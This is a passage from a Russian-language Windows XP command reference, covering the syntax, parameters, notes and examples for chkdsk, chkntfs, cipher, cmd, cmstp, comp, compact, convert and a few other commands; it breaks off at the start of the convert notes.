chkdsk [том:][[путь] имя_файла] [/f] [/v] [/r] [/x] [/i] [/c] [/l[:размер]]
Параметры

том:
    Указывает букву диска (с последующим двоеточием), точку подключения или имя тома.
[путь] имя_файла
    Задает местонахождение и имя файла или имена множества файлов, для которых команда chkdsk проверит степень фрагментации. Для задания нескольких файлов можно использовать подстановочные знаки (* и ?).
/f
    Задает исправление ошибок на диске. Диск должен быть заблокирован. Если диск не заблокирован командой chkdsk, отображается запрос на проверку диска при следующей перезагрузке компьютера.
/v
    Выводит на экран имена проверяемых файлов и каталогов.
/r
    Обнаруживает поврежденные сектора и восстанавливает ту часть данных, которая еще может быть прочитана. Диск должен быть заблокирован.
/x
    Используйте только с файловой системой NTFS. При необходимости инициирует операцию отключения тома в качестве первого действия. Все открытые дескрипторы диска будут неверны. Параметр /x включает также функциональные возможности параметра /f.
/i
    Используйте только с файловой системой NTFS. Выполняет менее тщательную проверку записей индекса, что уменьшает время, необходимое для работы команды chkdsk.
/c
    Используйте только с файловой системой NTFS. Пропускает проверку циклов в структуре папок, что уменьшает время, необходимое для работы команды chkdsk.
/l[:размер]
    Используйте только с файловой системой NTFS. Устанавливает указанный размер журнала. Если размер не указан, параметр /l выводит текущий размер.
/?
    Отображение справки в командной строке.

Заметки
- Выполнение команды chkdsk

Чтобы выполнить команду chkdsk для жестких дисков, необходимо быть членом группы администраторов.
- Проверка заблокированных дисков при перезагрузке

Если требуется исправить ошибки на диске с помощью команды chkdsk, нельзя открывать файлы на этом диске. В противном случае выводится следующее сообщение о ошибке:

Невозможно выполнить команду Chkdsk, так как указанный том используется другим процессом. Следует ли выполнить проверку этого тома при следующей перезагрузке системы? [Y(да)/N(нет)]

Если пользователь выберет эту возможность, команда chkdsk проверит диск и автоматически исправит ошибки при перезагрузке компьютера. Если проверяемый раздел диска является загрузочным, команда chkdsk автоматически перезагрузит компьютер после проверки этого диска.
- Отчет об ошибках

Команда chkdsk выполняет проверку дискового пространства и его использования для файловых систем таблица размещения файлов (FAT) и NTFS. Команда Chkdsk позволяет получить отчет о состоянии со сведениями по каждой файловой системе. Отчет о состоянии диска включает перечень найденных ошибок. Если команда chkdsk запущена без параметра /f в активном разделе, может быть получено сообщение о наличии серьезных ошибок, так как диск нельзя заблокировать. Для поиска ошибок команду chkdsk нужно запускать время от времени на каждом диске.
- Исправление ошибок

Если указан параметр командной строки /f, программа chkdsk исправляет ошибки на диске. При работе chkdsk должна обеспечиваться возможность блокирования диска для исправления ошибок. Поскольку при исправлении ошибок обычно изменяется таблица размещения файлов и иногда происходит потеря данных, программа chkdsk запрашивает подтверждение в следующем виде:

Потерянных кластеров: 10; цепочек: 3.

Преобразовать потерянные цепочки кластеров в файлы [Y(да)/N(нет)]?

Если ввести Y, Windows сохраняет каждую потерянную цепочку в корневом каталоге как файл с именем формата Filennnn.chk. После завершения выполнения chkdsk можно проверить эти файлы на наличие нужных сведений. Если ввести N, Windows исправляет ошибки на диске без сохранения данных из потерянных блоков.

Если параметр командной строки /f не используется, программа chkdsk только выдает сообщение о наличие ошибок в файле, но не исправляет их.

Если команда chkdsk /f запущена на диске большого объема (например 70 Гб) или диск содержит большое количество файлов (например несколько миллионов), для завершения работы программы chkdsk может потребоваться очень много времени (возможно несколько дней). В течение всего этого времени компьютер будет недоступен для пользователей, так как chkdsk не возвращает управления до завершения работы.
- Проверка дисков с файловой системой FAT

Система Windows выводит отчет программы chkdsk о состоянии диска с файловой системой FAT в следующем формате:

Серийный номер тома: B1AF-AFBF

72214528 байт всего на диске

73728 байт в 3 скрытых файлах

30720 байт в 12 каталогах

11493376 байт в 386 пользовательских файлах

61440 байт в поврежденных секторах

60555264 байт доступно на диске

2048 байт в каждом кластере

Всего кластеров на диске: 35261.

29568 кластеров на диске
- Проверка дисков с файловой системой NTFS

Система Windows выводит отчет программы chkdsk о состоянии диска с файловой системой NTFS в следующем формате:

Тип файловой системы: NTFS.

Проверка файлов...

Проверка файлов завершена.

Проверка индексов...

Проверка индесков завершена.

Проверка описателей защиты...

Проверка описателей защиты завершена.

12372 Кбайт всего на диске.

3 Кбайт в 1 пользовательских файлах.

2 КБ в 1 индексах.

4217 КБ используется системой.

8150 Кбайт свободно на диске.

Размер кластера: 512 байт.

Всего кластеров на диске: 24745.

16301 кластеров на диске.
- Использование chkdsk с открытыми файлами

Если указан параметр /f, команда chkdsk выводит сообщение об ошибке, если на диске найдены открытые файлы. Если же параметр /f не указан и на диске найдены открытые файлы, chkdsk может выводить сообщения о потерянных блоках на диске. Это произойдет в случае, когда открытые файлы еще не записаны в таблице размещения файлов. Если программа chkdsk сообщает о большом количестве потерянных блоков дискового пространства, должна быть рассмотрена возможность ремонта диска.
- Обнаружение физических ошибок диска

Используйте параметр командной строки /r для обнаружения физических ошибок диска в файловой системе. Для получения сведений о восстановлении физически поврежденных файлов с помощью команды recover щелкните ссылку «».
- Отчет о поврежденных секторах диска

Испорченные сектора, о которых сообщает команда chkdsk, были маркированы при первом форматировании диска. Такие сектора не представляют опасности.
- Общие сведения о кодах завершения программы

В следующей таблице перечислены коды завершения, которые могут содержатся в отчете программы chkdsk после окончания ее выполнения.
Код выхода     Описание
0     Не найдено ни одной ошибки.
1     Ошибки найдены и исправлены.
2     Была выполнена очистка диска, например удалены ненужные файлы, или очистка не была выполнена из-за отсутствия ключа /f.
3     Диск не может быть проверен, ошибки не могут быть исправлены или ошибки не были исправлены, так как не был задан ключ /f.
- Команда chkdsk с другими параметрами доступна в консоли восстановления.
Примеры

Если требуется проверить диск в дисководе D и исправить все обнаруженные ошибки в Windows, введите следующую команду:

chkdsk d: /f

Если обнаружена ошибка, выполнение программы сhkdsk приостанавливается и выводятся соответствующие сообщения. По окончании выполнения команды chkdsk на экран выводится отчет, содержащий сведения о текущем состоянии диска. До завершения работы chkdsk нельзя открывать какие-либо файлы на указанном диске.

Чтобы проверить фрагментацию всех файлов в текущем каталоге на диске с файловой системой FAT, введите следующую команду:

chkdsk *.*

Chkdsk выведет отчет о состоянии диска, а затем список фрагментированных файлов, удовлетворяющих шаблону команды.
========================================================================================
Chkntfs

Просмотр или задание планирования автоматической проверки системы для томов файловых систем FAT, FAT32 или NTFS при запуске компьютера.
Синтаксис

chkntfs том: [...]

chkntfs [/d]

chkntfs [/t[:время]]

chkntfs [/x том: [...]]

chkntfs [/c том: [...]]
Параметры

том: [...]
    Обязательный параметр. Указание буквы диска (с последующим двоеточием), точки подключения или имени тома. Выводит сообщение, в котором указана файловая система заданного тома. Если выполняется запланированная автоматическая проверка файлов, данный параметр позволяет вывести сообщение о повреждении тома. В этом случае необходимо запустить команду chkdsk.
/d
    Восстановление всех параметров chkntfs по умолчанию, за исключением времени, оставшегося до автоматической проверки файлов. По умолчанию при запуске компьютера проверяются все тома.
/t[:время]
    Изменение инициализации обратного времени отсчета в Autochk.exe на указанное значение времени в секундах. Если параметр :время не задан, параметр /t выводит текущее время обратного отсчета.
/x том: [...]
    Исключение указанного тома из проверки при запуске компьютера, даже если помечено, что для него требуется запуск chkdsk.
/c том: [...]
    Планирование проверки указанного тома при запуске компьютера.
/?
    Отображение справки в командной строке.

Заметки
- Чтобы выполнить команду chkntfs, необходимо быть членом локальной группы администраторов.- Хотя инициализацию времени обратного отсчета в Autochk.exe можно установить в ноль, это не позволит отменить автоматическую проверку файлов, которая является потенциально длительной процедурой.
Примеры

Чтобы вывести инициализацию времени обратного отсчета файла Autochk.exe, введите следующую команду:

chkntfs /t

При изменении инициализации времени обратного отсчета в Autochk.exe введите время в секундах. Например, чтобы установить время обратного отсчета в 30 секунд, введите следующую команду:

chkntfs /t:30

Параметр командной строки /x не обладает свойством накопления. Если он вводится несколько раз, самая последняя запись переопределяет предыдущие данные. Чтобы исключить несколько томов, перечислите их в одной команде. Например, чтобы исключить тома E: и F:, введите следующую команду:

chkntfs /x e: f:

Чтобы исключить только том F:, введите следующую команду:

chkntfs /x e:

chkntfs /x f:

Параметр командной строки /c обладает свойством накопления. Если требуется проверять только указанный том, восстановите параметры по умолчанию для сброса всех предыдущих команд, исключите проверку всех томов, а затем запланируйте автоматическую проверку файлов для нужного тома.

Например, чтобы запланировать автоматическую проверку файлов только на диске D:, введите следующие команды:

chkntfs /d

chkntfs /x c: d: e:

chkntfs /c d:
========================================================================================
Cipher

Отображение или изменение шифрование папок и файлов на томах NTFS. Использованная без параметров команда cipher отображает состояние шифрования текущей папки и всех файлов, находящихся в ней.
Синтаксис

cipher [{/e|/d}] [/s:каталог] [/a] [/i] [/f] [/q] [/h] [/k] [/u[/n]] [путь [...]] | [/r:имя_файла_без_расширения] | [/w:путь]
Параметры

/e
    Шифрует указанные папки. Папки помечаются таким образом, чтобы файлы, которые будут добавляться в папку позже, также шифровались.
/d
    Расшифровывает указанные папки. Папки помечаются таким образом, чтобы файлы, которые будут добавляться в папку позже, также шифровались.
/s: каталог
    Выполняет выбранную операцию над указанной папкой и всеми подпапками в ней.
/a
    Выполняет операцию над файлами и каталогами.
/i
    Продолжение выполнения указанной операции даже после возникновения ошибок. По умолчанию выполнение cipher прекращается после возникновения ошибки.
/f
    Выполнение шифрования или расшифровывания указанных объектов. По умолчанию уже зашифрованные или расшифрованные файлы пропускаются командой cipher.
/q
    Включение в отчет только наиболее важных сведений.
/h
    Отображение файлов с атрибутами «Скрытый» и «Системный». По умолчанию эти файлы не шифруются и не расшифровываются.
/k
    Создание ключа шифрования файла для пользователя, выполнившего команду cipher. Если используется данный параметр, все остальные параметры команды cipher не учитываются.
/u
    Обновление ключа шифрования файла пользователя или ключа агента восстановления на текущие ключи во всех зашифрованных файлах на локальном диске (если эти ключи были изменены). Этот параметр используется только вместе с параметром /n.
/n
    Запрещение обновления ключей. Данный параметр служит для поиска всех зашифрованных файлов на локальных дисках. Этот параметр используется только вместе с параметром /u. 
путь
    Указывает шаблон, файл или папку.
/r:имя_файла_без_расширения
    Создание нового сертификата агента восстановления и закрытого ключа с последующей их записью в файлах с именем, указанным в параметре имя_файла_без_расширения. Если используется данный параметр, все остальные параметры команды cipher не учитываются.
/w:путь
    Удаление данных из неиспользуемых разделов тома. Параметр путь может указывать на любой каталог нужного тома. Если используется данный параметр, все остальные параметры команды cipher не учитываются.
/?
    Отображение справки в командной строке.

Заметки
- Использование параметра /w

Параметр /w удаляет данные из доступных разделов тома и не применим к файлам или каталогам. При использовании данного параметра диск не блокируется, поэтому другие программы могут обращаться к разделам на диске, которые в этом случае не могут быть стерты cipher. Поскольку данный параметр выполняет запись в большую часть дискового тома, для завершения работы программы может потребоваться много времени, а поэтому его следует использовать только при необходимости.
- Шифрование и расшифровывание файлов

Чтобы предотвратить расшифровывание зашифрованного файла при изменении, рекомендуется зашифровать и файл, и папку, в которой он находится.
- Использование файлов и папок, доступных только для чтения

С помощью команды cipher нельзя зашифровать файлы, доступные только для чтения.
- Использованиее нескольких имен папок

Имеется возможность использовать несколько имен папок и подстановочные знаки.
- Использование нескольких параметров

Параметры должны быть разделены между собой по крайней мере одним пробелом.
Примеры

Чтобы зашифровать подпапку May в папке MonthlyReports с помощью команды cipher, введите следующую команду:

cipher /e monthlyreports\may

Чтобы зашифровать папку MonthlyReports, подпапки с January по December и подпапки Manufacturing в подпапках месяцев, введите:

cipher /e /s:monthlyreports

Чтобы зашифровать только файл Marketing.xls в подпапке May, введите:

cipher /e /a monthlyreports\may\marketing.xls

Чтобы зашифровать файл Marketing.xls, файл Maintenance.doc и подпапку Manufacturing (расположенные в папке May), введите:

cipher /e /a monthlyreports\may\ma*

Чтобы определить, зашифрована ли папка May, введите:

cipher monthlyreports\may

Чтобы определить, какие файлы зашифрованы в папке May, введите:

cipher monthlyreports\may\*
========================================================================================
Cls

Очистка окна командной строки.
Синтаксис

cls
Параметры

/?
    Отображение справки в командной строке.

Примеры

Чтобы очистить окно командной строки от сведений, которые в нем отображаются, и восстановить пустое окно, введите следующую команду:

cls
========================================================================================
Cmd

Запуск нового экземпляра программы командного процессора Cmd.exe. Выполненная без параметров команда cmd выводит сведения о версии Windows XP и авторских правах.
Синтаксис

cmd [[{/c|/k}] [/s] [/q] [/d] [{/a|/u}] [/t:тф] [/e:{on|off}] [/f:{on|off}] [/v:{on|off}] команда]
Параметры

/c
    Выполнение команды, заданной параметром команда, с завершением работы.
/k
    Выполнение команды, заданной параметром команда, с продолжением работы.
/s
    Изменение обработки команды после параметров /c или /k.
/q
    Выключение режима вывода команд на экран.
/d
    Отключение выполнения команд AutoRun.
/a
    Вывод сведений в формате ANSI (American National Standards Institute).
/u
    Вывод сведений в кодировке Юникод.
/t:тф
    Изменение цвета текста т и фона ф. В следующей таблице перечислены допустимые шестнадцатеричные числа, которые можно задать в качестве значений параметров т и ф.
    Значение     Цвет
    0     Черный
    1     Синий
    2     Зеленый
    3     Голубой
    4     Красный
    5     Сиреневый
    6     Желтый
    7     Белый
    8     Серый
    9     Светло-синий
    A     Светло-зеленый
    B     Светло-голубой
    C     Светло-красный
    D     Светло-сиреневый
    E     Светло-желтый
    F     Яркий белый
/e:on
    Включение расширений командного процессора.
/e:off
    Отключение расширений командного процессора.
/f:on
    Включение завершения имен файлов и папок.
/f:off
    Отключение завершения имен файлов и папок.
/v:on
    Включение отложенного расширения переменных среды.
/v:off
    Отключение отложенного расширения переменных среды.
строка
    Задание команды для выполнения.
/?
    Отображение справки в командной строке.

Заметки
- Использование нескольких команд

В параметре строка можно указать несколько команд, используя разделитель команд &&. Однако в этом случае необходимо заключить все эти команды в кавычки (например "команда&&команда&&команда").
- Обработка кавычек

Если указан параметр /c или /k, команда cmd обрабатывает остаток строки и кавычки сохраняются только при выполнении следующих условий:
- параметр /s не используется;- используется только одна пара кавычек;- текст в кавычках не содержит никаких специальных символов (например: &<>( ) @ ^ |);- текст в кавычках не содержит одного или нескольких пробелов;- строка в кавычках является именем исполняемого файла.

Если эти условия выполняются, строка обрабатывается, т. е. проверяется, является ли первый символ открывающей кавычкой. Если первый символ является открывающей кавычкой, он связывается с закрывающей кавычкой. Текст, следующий за закрывающей кавычкой, сохраняется.
- Выполнение подразделов реестра

Если в строке не указан параметр /d, программа Cmd.exe выполняет поиск следующих подразделов реестра:

HKEY_LOCAL_MACHINE\Software\Microsoft\Command Processor\AutoRun\REG_SZ

HKEY_CURRENT_USER\Software\Microsoft\Command Processor\AutoRun REG_EXPAND_SZ

Если присутствуют один или оба подраздела реестра, они выполняются перед всеми другими переменными.

Внимание!
- Ошибка при изменении реестра может серьезно повредить систему. Перед изменением реестра создайте резервную копию всех важных данных. - Разрешение и запрещение расширений командного процессора

В Windows XP расширения командного процессора разрешены по умолчанию. Эти расширения можно запретить в определенном процессе с помощью параметра /e:off. В компьютере или сеансе пользователя можно разрешить или запретить расширения для всех параметров команды cmd, задав следующие значения REG_DWORD:

HKEY_LOCAL_MACHINE\Software\Microsoft\Command Processor\EnableExtensions\REG_DWORD

HKEY_CURRENT_USER\Software\Microsoft\Command Processor\EnableExtensions\REG_DWORD

Установите в реестре значение REG_DWORD в 0?1 (т. е. разрешить) или 0?0 (т. е. запретить) с помощью программы Regedit.exe. Пользовательские настройки имеют приоритет над настройками компьютера, а параметры командной строки имеют приоритет над параметрами реестра.

Внимание!
- Ошибка при изменении реестра может серьезно повредить систему. Перед изменением реестра создайте резервную копию всех важных данных.

Если расширения командного процессора разрешены, вступают в силу следующие команды.
- assoc- call- chdir (cd)- color- del (erase)- endlocal- for- ftype- goto- if- mkdir (md)- popd- prompt- pushd- set- setlocal- shift- start (также вносит изменения во внешние командные процессы)

Дополнительные сведения об этих командах см. в разделе «».
- Включение отложенного расширения переменных среды

Если включено отложенное расширение переменных среды, можно воспользоваться восклицательным знаком, чтобы подставить значение переменной среды во время выполнения.
- Включение завершения имен файлов и папок

По умолчанию завершение имен файлов и папок не используется. Завершение имен файлов можно включить или отключить для определенного процесса команды cmd с помощью параметра /f:{on|off}. В компьютере или сеансе пользователя можно включить или отключить завершения имен файлов и папок для всех процессов команды cmd, задав следующие значения REG_DWORD:

HKEY_LOCAL_MACHINE\Software\Microsoft\Command Processor\CompletionChar\REG_DWORD

HKEY_LOCAL_MACHINE\Software\Microsoft\Command Processor\PathCompletionChar\REG_DWORD

HKEY_CURRENT_USER\Software\Microsoft\Command Processor\CompletionChar\REG_DWORD

HKEY_CURRENT_USER\Software\Microsoft\Command Processor\PathCompletionChar\REG_DWORD

Чтобы задать значение REG_DWORD, запустите программу Regedit.exe и введите шестнадцатеричное число управляющего символа для определенной функции (например 0?9 — это TAB, а 0?08 — это BACKSPACE). Пользовательские настройки имеют приоритет над настройками компьютера, а параметры командной строки имеют приоритет над параметрами реестра.

Внимание!
- Ошибка при изменении реестра может серьезно повредить систему. Перед изменением реестра создайте резервную копию всех важных данных.

Если включено завершение имен файлов и папок с помощью параметра /f:on, воспользуйтесь клавишами CTRL+D для завершения имен папок и CTRL+F для завершения имен файлов. Чтобы отключить определенный символ завершения в реестре, введите значение пробела [0?20], поскольку он не является допустимым управляющим символом.

Если нажать клавиши CTRL+D или CTRL+F, команда cmd выполнит завершение имени папки или файла. Данные комбинации клавиш выполняют следующие функции: добавление подстановочных знаков в строку (если они отсутствуют), создание списка подходящих путей, а затем отображение первого пути из этого списка. Если ни один из путей не удовлетворяет условиям отбора, функция завершения имен файлов и папок выдает звуковой сигнал не выводит сведения на экран. Для перемещения по списку путей, удовлетворяющих условиям отбора, нажимайте клавиши CTRL+D или CTRL+F. Для перемещения по списку в обратном порядке нажмите одновременно клавишу SHIFT и клавиши CTRL+D или CTRL+F. Чтобы сбросить сохраненный список путей, удовлетворяющих условиям отбора, и создать новый список, измените строку и нажмите клавиши CTRL+D или CTRL+F. При переключении между клавишами CTRL+D и CTRL+F сохраненный список путей сбрасывается и создается новый. Единственная разница между клавишами CTRL+D и CTRL+F заключается в том, что CTRL+D позволяет отбирать только имена файлов, а CTRL+F — как имена файлов, так и имена папок. Если завершения имен файлов и папок используется с одной из встроенных команд каталогов (т. е. CD, MD или RD), предполагается завершение папок.

Завершение имен файлов и папок правильно обрабатывает имена файлов, которые содержат пробелы или специальные символы, если соответствующий путь заключен в кавычки.

Кавычки необходимы при использовании следующих специальных символов: & < > [ ] { } ^ = ; ! ' + , ` ~ [пробел].

Если вводятся сведения, содержащие пробелы, заключите этот текст в кавычки (например "Имя компьютера").

Если выполняется завершение имен файлов и папок из строки, часть [пути], расположенная справа от курсора, (т. е. с той точки строки, с которой выполняется завершение) отбрасывается.
========================================================================================
Cmstp

Установка или удаление профиля службы диспетчера подключений. Выполненная без параметров команда cmstp устанавливает профиль службы со стандартными параметрами, соответствующими данной операционной системе и разрешениям пользователя.
Синтаксис

Синтаксис 1: имя_файла_профиля_службы.exe /q:a /c:"cmstp.exe имя_файла_профиля_службы.inf [/nf] [/ni] [/ns] [/s] [/su] [/u]"

Синтаксис 2: cmstp.exe [/nf] [/ni] [/ns] [/s] [/su] [/u] "[диск:][путь]имя_файла_профиля_службы.inf"
Параметры

имя_файла_профиля_службы.exe
    Обязательный параметр для синтаксиса 1, но недопустим для синтаксиса 2. Задает имя пакета установки, содержащего профиль, который требуется установить.
/q:a
    Обязательный параметр для синтаксиса 1, но недопустим для синтаксиса 2. Задает установку профиля без подтверждения пользователя. В этом случае будет отображаться сообщение об успешном завершении установки.
[диск:][путь]имя_файла_профиля_службы.inf
    Обязательный параметр. Задает имя файла настройки, который определяет режим установки профиля. Параметр [диск:][путь] недопустим для синтаксиса 1.
/nf
    Файлы поддержки не устанавливаются.
/ni
    Значок на рабочем столе не создается. Данный параметр применяется только на компьютерах, работающих под управлением операционных систем Windows 95, Windows 98, Windows NT 4.0 или Windows Millennium Edition.
/ns
    Ярлык на рабочем столе не создается. Данный параметр применяется только на компьютерах, работающих под управлением операционных систем Windows 2000 или Windows XP.
/s
    Отмена уведомлений (т. е. запросов на подтверждения пользователя и сообщения об успешном завершении установки) при установке или удалении профиля службы.
/su
    Профиль службы устанавливается только для одного, а не для всех пользователей. Данный параметр применяется только на компьютерах, работающих под управлением операционных систем Windows 2000 или Windows XP.
/u
    Удаление профиля службы.
/?
    Отображение справки в командной строке.

Заметки
- /s — единственный параметр, который можно использовать вместе с /u.- Синтаксис 1 обычно используется в приложении выборочной установки. Чтобы воспользоваться этим синтаксисом, необходимо запустить команду cmstp из каталога, в котором находится файл, указанный в параметре имя_файла_профиля_службы.exe.
Примеры

Следующие примеры иллюстрируют возможные варианты использования команды cmstp при работе с вымышленным профилем службы Fiction и его файлами.
- Чтобы установить профиль службы Fiction без файлов поддержки, введите следующую команду:

fiction.exe /c:"cmstp.exe fiction.inf /nf"
- Чтобы установить профиль службы Fiction для одного пользователя без уведомлений, введите следующую команду:

fiction.exe /c:"cmstp.exe fiction.inf /s /su"
- Чтобы удалить профиль службы Fiction без уведомлений, введите следующую команду:

fiction.exe /c:"cmstp.exe fiction.inf /s /u"
========================================================================================
Color

Изменение цвета текста и фона в окне командной строки для текущего сеанса. Выполненная без параметров команда color восстанавливает стандартные цвета текста и фона в окне командной строки.
Синтаксис

color [тф]
Параметры

тф
    Изменение цвета текста т и фона ф. В следующей таблице перечислены допустимые шестнадцатеричные числа, которые можно задать в качестве значений параметров т и ф.
    Значение     Цвет
    0     Черный
    1     Синий
    2     Зеленый
    3     Голубой
    4     Красный
    5     Сиреневый
    6     Желтый
    7     Белый
    8     Серый
    9     Светло-синий
    A     Светло-зеленый
    B     Светло-голубой
    C     Светло-красный
    D     Светло-сиреневый
    E     Светло-желтый
    F     Яркий белый
/?
    Отображение справки в командной строке.

Заметки
- Чтобы задать стандартные цвета в окне командной строки, щелкните левый верхний угол этого окна, выберите команду Умолчания, перейдите к вкладке Цвета и укажите цвета для параметров Текст на экране и Фон экрана.- Для изменения цветов окна командной строки в текущем сеансе можно воспользоваться командой cmd /t:тф.- Если цвета текста и фона совпадают, команда color устанавливает значение параметра ERRORLEVEL в единицу (1).
Примеры

Чтобы изменить цвет текста на красный, а цвет фона на белый в окне командной строки, введите следующую команду:

color FC
========================================================================================
Comp

Побайтное сравнение двух или нескольких файлов. Команда comp позволяет сравнивать файлы, находящиеся на разных дисках и в разных каталогах. При сравнении файлов с помощью команды comp выводятся их имена и расположения. Выполненная без параметров команда comp запрашивает файлы для сравнения.
Синтаксис

comp [файл1] [файл2] [/d] [/a] [/l] [/n=кол_строк] [/c]
Параметры

файл1
    Задание имени и расположения первого файла или набора файлов для сравнения. Для указания нескольких файлов можно использовать подстановочные знаки (* и ?).
файл2
    Задание имени и расположения второго файла или набора файлов для сравнения. Для задания нескольких файлов можно использовать подстановочные знаки (* и ?).
/d
    Вывод различий в десятичном формате. (По умолчанию используется шестнадцатеричный формат.)
/a
    Вывод различий в символьном виде.
/l
    Вывод номера строки, в которой обнаружено различие, вместо отображения смещения в байтах.
/n=кол_строк
    Сравнение первых нескольких строк, заданных параметром кол_строк, обоих файлов, даже если эти файлы имеют разный размер.
/c
    Сравнение без учета регистра.
/?
    Отображение справки в командной строке.

Примечания
- Сравнение файлов с одинаковыми именами

Если сравниваются файлы с одинаковыми именами, они должны находятся в разных каталогах или на разных дисках. Если в параметре файл2 не указано имя файла, предполагается, что имя файл2 совпадает с именем файл1. Для задания имен файлов можно использовать подстановочные знаки (* и ?).
- Неполное задание параметров файл1 и файл2

Если имена файлов файл1 или файл2 введены не полностью или параметр файл2 пропущен, программа comp выведет на экран запрос для получения недостающих сведений. Если параметр файл1 содержит только имя диска или каталога без имени файла, команда comp сравнивает все файлы в заданном каталоге с файлом файл2. Если параметр файл2 содержит только имя диска или каталога, будет предполагаться, что имя файла файл2 такое же, как в параметре файл1.
- Вывод информации о несовпадениях

В процессе сравнения программа comp выводит сообщения с указанием расположения несовпадающих байтов в файлах. В каждое сообщение включены сведения о смещении адреса несовпадающих байтов и содержимое этих байт (в шестнадцатеричном формате, если не указан параметр /a или /d). Эти сообщения имеют следующий формат:

Ошибка сравнения OFFSET xxxxxxxx

файл1 = xx

файл2 = xx

После того как найдено 10 различий, работа команды comp прекращается и выводится следующее сообщение:

Обнаружено 10 различий. Сравнение завершено.
- Сравнение файлов разного размера

Чтобы сравнить файлы разных размеров, необходимо указать параметр /n. Если файлы имеют различные размеры, comp выводит следующее сообщение:

Разные размеры файлов

Сравнить другие файлы [Y(да)/N(нет)]?

Нажмите клавишу Y для сравнения следующей пары файлов. Нажмите клавишу N для завершения выполнения команды comp.

При нажатии клавиши Y команда comp продолжает сравнение с заданными параметрами, пока не будет нажата клавиша N или заново введена эта команда.

При работе с файлами разного размера воспользуйтесь параметром /n, чтобы сравнить только начала файлов.
- Последовательное сравнение файлов

Если использованы подстановочные знаки (* и ?) для задания нескольких файлов, comp найдет первый файл, удовлетворяющий шаблону файл1, и выполнит его сравнение с соответствующим файлом файл2, если он существует. Команда comp выводит результаты сравнения и проводит сравнение всех файлов, удовлетворяющих шаблону файл1. После завершения работы comp будет выведено следующее сообщение:

Сравнить другие файлы [Y(да)/N(нет)]?

Чтобы сравнить другие файлы, нажмите клавишу Y. Команда comp запросит расположения и имена новых файлов. Чтобы завершить сравнение, нажмите клавишу N. При нажатии клавиши Y команда comp запрашивает параметры командной строки. Если эти параметры не заданы, программа comp использует параметры, введенные ранее.
- Если файлы не найдены

Если командой comp не найдены указанные файлы, выводится запрос на продолжение сравнения.
Примеры

Чтобы сравнить содержимое каталога C:\Reports с содержимым каталога резервных копий \\Sales\Backup\April, введите следующую команду:

comp c:\reports \\sales\backup\april

Чтобы сравнить первые десять строк файлов в каталоге \Invoice и вывести результат в десятичном формате, введите следующую команду:

comp \invoice\*.txt \invoice\backup\*.txt /n=10 /d
========================================================================================
Compact

Вывод сведений или изменение уплотнения файлов и каталогов в разделах NTFS. Запущенная без параметров команда compact выводит сведения об уплотнении файлов в текущем каталоге.
Синтаксис

compact [{/c|/u}] [/s[:каталог]] [/a] [/i] [/f] [/q] [имя_файла[...]]
Параметры

/c
    Уплотнение заданного каталога или файла.
/u
    Разуплотнение заданного каталога или файла.
s:каталог
    Задание выполнения операции (уплотнения или разуплотнения) во всех подкаталогах указанного или текущего каталога.
/a
    Отображение скрытых и системных файлов.
/i
    Игнорирование ошибок.
/f
    Принудительное уплотнение или разуплотнение каталогов или файлов. Используется в случае, когда предыдущая операция над данным каталогом или файлом была прервана в результате сбоя системы. Для полного уплотнения частично уплотненного файла используются параметры /c и /f, а также задается имя такого файла.
/q
    Включение в отчет только существенных сведений.
имя_файла
    Задание имени файла или каталога. Допускается использование нескольких имен файлов и подстановочных знаков (* и ?).
/?
    Отображение справки в командной строке.

Примечания
- Команда compact является интерфейсом командной строки для встроенного средства уплотнения NTFS. Команда позволяет просматривать и задавать атрибуты уплотнения файлов и каталогов разделов дисков с файловой системой NTFS. Состояние сжатия каталога показывает, будут ли автоматически сжаты файлы, добавляемые в каталог. Когда изменяется состояние сжатия каталога, не нужно изменять состояние сжатия файлов, уже помещенных в каталог.- Нельзя использовать команду compact для чтения, записи и присоединения томов, уплотненных служебными программами DriveSpace и DoubleSpace.
Примеры

Чтобы задать состояние уплотнения текущей папки, а также ее подпапок и существующих файлов, из этой папки, введите следующую команду:

compact /c /s

Чтобы задать состояние уплотнения файлов в текущей папке, а также всех ее подпапок и файлов в них, без изменения состояния самой этой папки, введите следующую команду:

compact /c /s *.*

Чтобы уплотнить том из корневой папки этого тома, введите следующую команду:

compact /c /i /s:\

В этом примере задается состояние уплотнения корневой папки и всех папок данного тома, а также уплотняются все файлы этого тома. Параметр /i позволяет отменить вывод сообщений об ошибках, чтобы не прерывать процесс уплотнения.

Чтобы уплотнить все файлы с расширением .bmp в каталоге \Tmp и его подкаталогах, но без установки атрибута уплотнения для этих каталогов, введите следующую команду:

compact /c /s:\tmp *.bmp

Чтобы завершить уплотнение файла Zebra.bmp, который был частично уплотнен до сбоя системы, выполните следующую команду:

compact /c /f zebra.bmp

Чтобы удалить атрибуты уплотнения в каталоге C:\Tmp, но без изменения уплотнения файлов в этом каталоге, введите следующую команду:

compact /u c:\tmp
========================================================================================
Convert

Преобразование томов с файловой системой FAT и FAT32 в тома с файловой системой NTFS.
Синтаксис

convert [том] /fs:ntfs [/v] [/cvtarea:имя_файла] [/nosecurity] [/x]
Параметры

том
    Указание буквы диска (с последующим двоеточием), точки подключения или имени тома, преобразуемых в файловую систему NTFS. 
/fs:ntfs
    Обязательный параметр. Преобразование тома в файловую систему NTFS.
/v
    Задание режима вывода дополнительной информации, т. е. в процессе преобразования выводятся все сообщения.
/cvtarea:имя_файла
    Только для опытных пользователей. Задание записи основной таблицы файлов (MFT) и прочих файлов метаданных NTFS в существующий непрерывный файл-заглушку. Этот файл должен находится в корневом каталоге преобразуемой файловой системы. Использование параметра /CVTAREA позволяет получить менее фрагментированную файловую систему после преобразования. Для получения оптимальных результатов размер этого файла должен равняться числу файлов и каталогов в файловой системе, выраженному в килобайтах, однако служебная программа преобразования обрабатывает файлы любого размера.

    Дополнительные сведения о применении параметра /cvtarea см. по ссылке File Systems на веб-узле Microsoft Windows XP Resource Kits.(http://www.microsoft.com/)

    Важно!
    - Файл-заглушку необходимо создать перед выполнением команды convert с помощью команды fsutil file createnew. Команда convert не позволяет создать этот файл. Эта команда только перезаписывает данный файл данными NTFS. После преобразования все неиспользованное пространство этого файла освобождается. Дополнительные сведения о команде fsutil file см. по ссылке «». 
/nosecurity
    Задание свободного доступа к параметрам безопасности преобразованных файлов и каталогов.
/x
    Отключение тома перед преобразованием при необходимости. Все открытые дескрипторы тома становятся недействительными.

Примечания
